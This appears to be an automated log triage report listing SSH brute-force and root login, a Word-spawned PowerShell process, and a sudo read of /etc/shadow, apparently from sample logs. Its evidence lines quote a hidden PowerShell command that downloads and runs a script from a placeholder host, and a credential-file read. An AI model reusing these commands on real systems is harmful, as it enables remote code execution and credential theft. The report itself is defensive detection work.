# Log Triage Report - 2026-04-25

## Summary

- Events processed: **32**
- High findings: **4**
- Medium findings: **1**
- Low findings: **0**

## High-priority findings

### [High - 90] successful_after_failures
- **When:** 2026-04-25T06:55:03+00:00
- **What:** Successful login as root from 203.0.113.45 after 15 failures
- **Evidence:**
  - `Apr 25 06:55:03 srv01 sshd[1235]: Accepted password for root from 203.0.113.45 port 22`

### [High - 85] suspicious_powershell
- **When:** 2026-04-25T06:49:03+00:00
- **What:** Suspicious PowerShell on WIN-FIN01 by alice
- **Evidence:**
  - `{"TimeCreated": "2026-04-25T06:49:03Z", "MachineName": "WIN-FIN01", "Id": 4104, "User": "alice", "IpAddress": null, "Process": "powershell.exe", "Parent": null, "Message": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAA... IEX (New-Object Net.WebClient).DownloadString('http://bad.example/a.ps1')"}`

### [High - 80] failed_login_burst
- **When:** 2026-04-25T06:49:23+00:00
- **What:** 10+ failed logins from 203.0.113.45 in 0:05:00
- **Evidence:**
  - `Apr 25 06:46:23 srv01 sshd[1234]: Failed password for root from 203.0.113.45 port 22`
  - `Apr 25 06:46:43 srv01 sshd[1234]: Failed password for root from 203.0.113.45 port 22`
  - `Apr 25 06:47:03 srv01 sshd[1234]: Failed password for root from 203.0.113.45 port 22`

### [High - 75] unusual_process_spawn
- **When:** 2026-04-25T06:48:03+00:00
- **What:** winword.exe spawned powershell.exe on WIN-FIN01 (likely macro/phishing)
- **Evidence:**
  - `{"TimeCreated": "2026-04-25T06:48:03Z", "MachineName": "WIN-FIN01", "Id": 4688, "User": "alice", "IpAddress": null, "Process": "powershell.exe", "Parent": "winword.exe", "Message": "A new process has been created."}`

## Medium findings

### [Medium - 55] privilege_escalation
- **When:** 2026-04-25T07:01:03+00:00
- **What:** Privilege escalation via sudo by jdoe
- **Evidence:**
  - `Apr 25 07:01:03 srv01 sudo: jdoe : TTY=pts/0 ; PWD=/home/jdoe ; USER=root ; COMMAND=/bin/cat /etc/shadow`

## Low findings

_None._

## Stats

- Time range: 2026-04-25T05:03:03+00:00 -> 2026-04-25T07:03:03+00:00
- Top source IPs: [('203.0.113.45', 16), ('10.0.0.5', 1), ('10.0.0.12', 1), ('10.0.0.10', 1)]
- Top users: [('root', 16), ('jdoe', 2), ('alice', 2), ('alhassana', 1), ('Administrator', 1)]
